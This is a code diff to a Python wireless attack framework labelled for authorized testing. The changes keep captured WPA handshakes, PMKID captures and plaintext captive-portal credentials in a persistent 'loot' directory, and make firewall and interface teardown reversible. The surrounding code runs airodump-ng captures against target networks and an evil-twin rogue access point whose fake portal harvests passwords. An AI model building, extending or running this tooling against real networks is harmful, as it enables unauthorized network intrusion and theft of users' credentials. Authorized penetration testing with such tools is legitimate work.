@@ -59,13 +59,21 @@ Self-protection
     the box off the network.
 
 Teardown
-    Host state is reversible. Released adapters are re-managed, monitor
-    interfaces returned to managed mode, virtual interfaces (at0) and the nat/
-    FORWARD iptables chains flushed, and the temp dir removed. NetworkManager is
-    left running throughout, so cleanup never bounces the operator's link.
+    Host state is reversible. iptables and net.ipv4.ip_forward are snapshotted
+    at startup and restored from that snapshot on teardown - never blind-
+    flushed - so any pre-existing host firewall / Docker / custom rules survive
+    the run. Released adapters are re-managed, monitor interfaces returned to
+    managed mode, virtual interfaces (at0) removed, and the throwaway scratch
+    dir deleted. An atexit hook plus SIGTERM/SIGHUP handlers guarantee
+    restoration even when the run does not exit cleanly. NetworkManager is left
+    running throughout, so cleanup never bounces the operator's link.
 
-Captured credentials from the captive-portal path are written to a timestamped
-file under the run's temp dir.
+Loot
+    Captured artifacts - WPA handshakes, PMKID captures, and captive-portal
+    credentials - are written to a persistent, timestamped loot directory
+    (waf_loot_<stamp>/ under the launch cwd), created 0700 with credential
+    files forced to 0600. This directory is NOT removed on teardown; only the
+    throwaway scratch temp dir is.
 """
 
 import subprocess
@@ -75,6 +83,8 @@ import re
 import json
 import time
 import glob
+import atexit
+import signal
 import tempfile
 import threading
 import http.server
@@ -974,20 +984,42 @@ class AttackQueue:
 
 class WirelessAttackFramework:
 
-    def __init__(self):
+    def __init__(self, output_dir: Path | None = None):
         self.registry    = ProcessRegistry()
         self.iface_mgr   = InterfaceManager()
         self.scan_engine: ScanEngine | None = None
         self.attack_queue = AttackQueue()
 
+        # Throwaway scratch: scan CSVs, portal scaffolding, dnsmasq.conf.
+        # Everything here is deleted on teardown.
         self.temp_dir: Path = Path(
-            tempfile.mkdtemp(prefix='waf_',
-                             dir='/tmp',
-                             )
+            tempfile.mkdtemp(prefix='waf_', dir='/tmp')
         )
+
+        # Persistent loot: handshakes, PMKIDs, captured credentials. Created
+        # 0700 on first write and NEVER deleted on teardown. Timestamped so
+        # back-to-back runs don't collide. Defaults under the launch cwd;
+        # override with output_dir (--output-dir once argparse lands).
+        run_stamp     = datetime.now().strftime('%Y%m%d_%H%M%S')
+        base          = Path(output_dir) if output_dir else Path.cwd()
+        self.loot_dir: Path = base / f'waf_loot_{run_stamp}'
+        self._loot_ready = False
+
         self.config_file = Path.cwd() / 'wireless_attack_config.json'
         self.tool_paths: dict[str, str] = {}
         self.selected_targets: list[dict] = []
+
+        # Host-state snapshots for reversible teardown (§6). Captured once,
+        # before anything is mutated; restored on teardown and as an
+        # atexit/signal backstop.
+        self._iptables_snapshot: str | None = None
+        self._ip_forward_prior:  str | None = None
+        self._host_state_saved   = False
+
+        # Teardown must be idempotent: the finally in run(), the atexit hook,
+        # and the signal handler can all fire. Lock + flag make 2nd/3rd no-ops.
+        self._cleanup_lock = threading.Lock()
+        self._cleaned_up   = False
 
         self._load_config()
         self._check_tools()
@@ -1051,6 +1083,112 @@ class WirelessAttackFramework:
             print(f"\nRequired tool '{name}' not found. Install it and restart.")
             input("Press Enter to continue...")
         return path
+
+    # ------------------------------------------------------------------
+    # Loot directory (persistent, mode-restricted)
+    # ------------------------------------------------------------------
+
+    def _loot_path(self, name: str) -> str:
+        """
+        Return an absolute path inside the persistent loot dir, creating the
+        dir 0700 on first use. Captured artifacts (handshakes, PMKIDs, creds)
+        go here so they survive teardown - unlike temp_dir, which is wiped.
+        """
+        if not self._loot_ready:
+            self.loot_dir.mkdir(parents=True, exist_ok=True)
+            try:
+                os.chmod(self.loot_dir, 0o700)
+            except OSError:
+                pass
+            self._loot_ready = True
+            print(f"Loot directory: {self.loot_dir}")
+        return str(self.loot_dir / name)
+
+    # ------------------------------------------------------------------
+    # Host-state snapshot / restore (reversible teardown - §6)
+    # ------------------------------------------------------------------
+
+    def _snapshot_host_state(self):
+        """
+        Capture host state we are about to mutate, ONCE, before touching
+        anything: the full iptables ruleset and the current ip_forward value.
+        Teardown restores from these rather than blind-flushing, so a
+        pre-existing host firewall / Docker / custom rules survive the run.
+        Idempotent - guarded so the first (pristine) snapshot is the one kept.
+        """
+        if self._host_state_saved:
+            return
+
+        # Full ruleset across all tables in one blob (iptables-restore reads
+        # this verbatim). Falls back to None if iptables-save is unavailable,
+        # in which case teardown leaves iptables alone rather than flushing.
+        try:
+            r = subprocess.run(['sudo', 'iptables-save'],
+                               capture_output=True, text=True)
+            self._iptables_snapshot = r.stdout if r.returncode == 0 else None
+        except Exception:
+            self._iptables_snapshot = None
+
+        try:
+            self._ip_forward_prior = Path(
+                '/proc/sys/net/ipv4/ip_forward'
+            ).read_text().strip()
+        except Exception:
+            self._ip_forward_prior = None
+
+        self._host_state_saved = True
+
+    def _restore_iptables(self):
+        """
+        Restore the iptables ruleset captured at startup. No-op (leaves rules
+        untouched) if we never got a snapshot - we never flush blind.
+        Idempotent: safe from portal teardown and full cleanup both.
+        """
+        if self._iptables_snapshot is None:
+            return
+        try:
+            subprocess.run(['sudo', 'iptables-restore'],
+                           input=self._iptables_snapshot, text=True,
+                           capture_output=True)
+        except Exception:
+            pass
+
+    def _restore_ip_forward(self):
+        """Restore ip_forward to its pre-run value. Idempotent."""
+        if self._ip_forward_prior is None:
+            return
+        try:
+            subprocess.run(
+                ['sudo', 'sysctl', '-w',
+                 f'net.ipv4.ip_forward={self._ip_forward_prior}'],
+                capture_output=True
+            )
+        except Exception:
+            pass
+
+    # ------------------------------------------------------------------
+    # Signal / exit backstop (§6)
+    # ------------------------------------------------------------------
+
+    def _install_backstop(self):
+        """
+        Guarantee host-state restoration even when the run does not exit
+        cleanly. The finally in run() covers normal exit and Ctrl-C; this
+        covers SIGTERM, SIGHUP (terminal closed), and anything that raises
+        SystemExit. Cleanup is idempotent, so firing more than once is safe.
+        """
+        atexit.register(self._full_cleanup)
+        for sig in (signal.SIGTERM, signal.SIGHUP):
+            try:
+                signal.signal(sig, self._signal_handler)
+            except (ValueError, OSError):
+                # Not main thread / signal unavailable - atexit still covers us.
+                pass
+
+    def _signal_handler(self, signum, frame):
+        print(f"\nReceived signal {signum} - restoring host state...")
+        self._full_cleanup()
+        sys.exit(128 + signum)
 
     # ------------------------------------------------------------------
     # Startup flow
@@ -1454,7 +1592,7 @@ class WirelessAttackFramework:
         if not airodump:
             return
 
-        out = str(self.temp_dir / f"pmkid_{target['bssid'].replace(':', '')}")
+        out = self._loot_path(f"pmkid_{target['bssid'].replace(':', '')}")
         print(f"\nPMKID CAPTURE → {target['essid']}")
         print(f"RX iface : {cap_iface}")
         cmd = [
@@ -1475,7 +1613,7 @@ class WirelessAttackFramework:
         if not airodump:
             return
 
-        out = str(self.temp_dir / f"handshake_{target['bssid'].replace(':', '')}")
+        out = self._loot_path(f"handshake_{target['bssid'].replace(':', '')}")
         print(f"\nWPA HANDSHAKE CAPTURE → {target['essid']}")
         print(f"RX iface : {cap_iface}")
         if self.iface_mgr.dual_interface:
@@ -1631,7 +1769,7 @@ class WirelessAttackFramework:
 
             self._set_target_channel(target)
 
-            out = str(self.temp_dir / f"combo_hs_{target['bssid'].replace(':', '')}")
+            out = self._loot_path(f"combo_hs_{target['bssid'].replace(':', '')}")
             cap_cmd = [
                 'sudo', airodump,
                 '-c', target['channel'].strip(),
@@ -1934,6 +2072,11 @@ class WirelessAttackFramework:
 
     def _launch_rogue_ap_with_portal(self, target: dict, portal_dir: Path, subdir: str):
         """Launch airbase-ng + dnsmasq + Python web server for captive portal."""
+        # Snapshot host state before we touch iptables/ip_forward, in case the
+        # portal is driven directly rather than through run(). No-op if run()
+        # already snapshotted.
+        self._snapshot_host_state()
+
         mon      = self.iface_mgr.monitor_interface
         airbase  = self._require_tool('airbase-ng')
         dnsmasq  = self._require_tool('dnsmasq')
@@ -1963,7 +2106,15 @@ class WirelessAttackFramework:
             return
 
         web_root   = index_file.parent
-        creds_file = self.temp_dir / f"creds_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
+        creds_file = Path(self._loot_path(
+            f"creds_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"))
+        # Pre-create 0600 so captured plaintext credentials are never
+        # world-readable, regardless of umask or when the first POST lands.
+        try:
+            creds_file.touch()
+            os.chmod(creds_file, 0o600)
+        except OSError:
+            pass
         target_ssid = target['essid']
 
         class CaptivePortalHandler(http.server.SimpleHTTPRequestHandler):
@@ -2098,9 +2249,10 @@ class WirelessAttackFramework:
             for name, proc in processes:
                 self.registry.terminate(name)
 
-            # iptables cleanup
-            subprocess.run(['sudo', 'iptables', '-t', 'nat', '-F'], capture_output=True)
-            subprocess.run(['sudo', 'iptables', '-F', 'FORWARD'], capture_output=True)
+            # Restore iptables + ip_forward to the pre-run snapshot instead of
+            # blind-flushing, so any pre-existing host rules survive.
+            self._restore_iptables()
+            self._restore_ip_forward()
 
             # at0 cleanup
             for cmd in (
@@ -2193,47 +2345,55 @@ class WirelessAttackFramework:
     # ------------------------------------------------------------------
 
     def _full_cleanup(self):
+        # Idempotent: finally + atexit + signal handler may all call this.
+        with self._cleanup_lock:
+            if self._cleaned_up:
+                return
+            self._cleaned_up = True
+
         print("\n" + "=" * 60)
         print("CLEANING UP")
         print("=" * 60)
 
-        # Stop all registered processes
+        # 1. Stop new work / drain in-flight: registered processes first...
         self.registry.terminate_all()
-
-        # Kill any lingering wireless attack binaries
-        for binary in ('airbase-ng', 'airodump-ng', 'aireplay-ng', 'mdk3', 'dnsmasq'):
+        # ...then any lingering attack binaries that escaped the registry.
+        for binary in ('airbase-ng', 'airodump-ng', 'aireplay-ng',
+                       'mdk4', 'mdk3', 'dnsmasq'):
             self.registry.kill_by_name(binary)
-
         time.sleep(1)
 
-        # Remove virtual interfaces
+        # 2. Remove virtual interfaces created for the rogue AP.
         for viface in ('at0', 'mon0'):
-            subprocess.run(['sudo', 'ip', 'link', 'delete', viface], capture_output=True)
+            subprocess.run(['sudo', 'ip', 'link', 'delete', viface],
+                           capture_output=True)
 
-        # iptables cleanup
-        subprocess.run(['sudo', 'iptables', '-t', 'nat', '-F'], capture_output=True)
-        subprocess.run(['sudo', 'iptables', '-F', 'FORWARD'], capture_output=True)
+        # 3. Restore host state to the pre-run snapshot - iptables and
+        #    ip_forward - rather than blind-flushing operator/Docker rules.
+        self._restore_iptables()
+        self._restore_ip_forward()
 
-        # Restore interface (re-manages released adapters, returns monitor
-        # interfaces to managed mode).
+        # 4. Return adapters to NetworkManager / managed mode. NM was never
+        #    killed (adapters are released individually), so this does not
+        #    bounce the operator's own link.
         self.iface_mgr.disable_monitor_mode()
 
-        # Remove temp directory
+        # 5. Wipe the throwaway scratch dir ONLY. Loot (handshakes, PMKIDs,
+        #    creds) lives in self.loot_dir and is deliberately left in place.
         try:
             shutil.rmtree(self.temp_dir, ignore_errors=True)
         except Exception:
             pass
+        if self._loot_ready:
+            print(f"Loot preserved: {self.loot_dir}")
 
-        # Restore DNS. NetworkManager was never killed (adapters are released
-        # individually), so it is not restarted here - restarting it would
-        # bounce the operator's own link.
-        subprocess.run(['sudo', 'systemctl', 'start', 'systemd-resolved'], capture_output=True)
+        # 6. Restore DNS. NetworkManager was never killed, so it is not
+        #    restarted here - restarting it would bounce the operator's link.
+        subprocess.run(['sudo', 'systemctl', 'start', 'systemd-resolved'],
+                       capture_output=True)
 
-        # Backstop: if a foreground tool (airbase-ng, aireplay-ng) left the tty
-        # in raw / no-echo mode on interrupt, hand the operator back a sane
-        # shell rather than a dead terminal.
+        # 7. Backstop: hand back a sane tty if a foreground child left it raw.
         reset_terminal()
-
         print("Cleanup complete.")
 
     # ------------------------------------------------------------------
@@ -2245,6 +2405,11 @@ class WirelessAttackFramework:
         print(" RED CELL SECURITY - WIRELESS ATTACK FRAMEWORK")
         print(" FOR AUTHORIZED SECURITY TESTING ONLY")
         print("=" * 60)
+
+        # Install the teardown backstop and snapshot host state BEFORE any
+        # mutation, so an interrupted run (SIGTERM/SIGHUP/crash) still restores.
+        self._install_backstop()
+        self._snapshot_host_state()
 
         try:
             if not self._setup_interfaces():
